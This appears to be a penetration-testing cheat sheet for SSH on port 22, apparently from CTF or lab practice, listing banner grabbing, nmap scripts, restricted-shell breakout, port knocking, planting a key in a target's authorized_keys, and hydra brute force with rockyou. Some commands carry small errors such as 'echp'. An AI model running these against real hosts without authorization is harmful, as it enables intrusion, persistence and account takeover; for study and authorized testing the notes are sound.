# 22 (SSH)

## Enumeration

### Banner Grabbing

```bash
nc <IP> 22
nc -vn <IP> 22
```

### Connections

#### SSH

```bash
ssh <username>@<IP>
ssh <username>@<IP> -i id_rsa  # Login via private key. chmod 600
```

#### SCP

```bash
scp <filename> <username>@<IP>:/path/to/copy
```

#### SFTP

```bash
sftp <IP>
```

### nmap Scripts

```bash
nmap -p 22000 -sV -Pn -T4 --script=ssh* <IP>
```

### Restricted Shell Breakout

```bash
ssh joe@funbox -i joe_id_rsa -t "bash --noprofile"
ssh seppuku@192.168.53.90 -t "bash --noprofile"
```

### Account Login Error

```bash
# When getting a specific error where only SFTP works, try...
ssh -v <username>@<IP> id
ssh -v <username>@<IP> /bin/bash
```

### Port knocking

```bash
# If nmap comes back showing port 22 as filtered...
# We need to find the /etc/knockd.conf (thorough LFI or FTP or something else)
# Inside there is a sequence
knock IP SEQUENCE1 SEQUENCE2 SEQUENCE3
# Check nmap again
```

### Key Generation

```bash
# Attack machine
ssh-keygen
chmod 600
cat <filename>.pub
# Target
echp <filename>.pub >> <PATH>/.ssh/authorized_keys
```

## Brute Force

```bash
hydra -v  -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 <IP> ssh
hydra -l <username> -P passwords.txt -T 20 <IP> ssh
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV
```
